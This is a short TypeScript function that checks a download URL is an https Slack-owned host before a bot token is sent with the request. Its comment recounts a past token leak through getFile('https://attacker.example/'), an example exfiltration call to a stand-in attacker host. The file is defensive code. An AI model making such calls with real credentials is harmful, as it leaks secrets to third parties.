// The download request carries the bot token in an Authorization header, so the
// URL MUST be a Slack-owned host — otherwise a caller could name any URL and the
// token would be sent straight to a third-party server (how the bot token was
// once exfiltrated: getFile("https://attacker.example/") mailed the token out).
// Slack serves file downloads from files.slack.com / *.slack.com / slack-files.com.
export function isSlackFileHost(candidate: string): boolean {
  let parsed: URL;
  try {
    parsed = new URL(candidate);
  } catch {
    return false;
  }
  if (parsed.protocol !== 'https:') {
    return false;
  }
  const host = parsed.hostname.toLowerCase();
  return (
    host === 'slack.com' ||
    host.endsWith('.slack.com') ||
    host === 'slack-files.com' ||
    host.endsWith('.slack-files.com')
  );
}
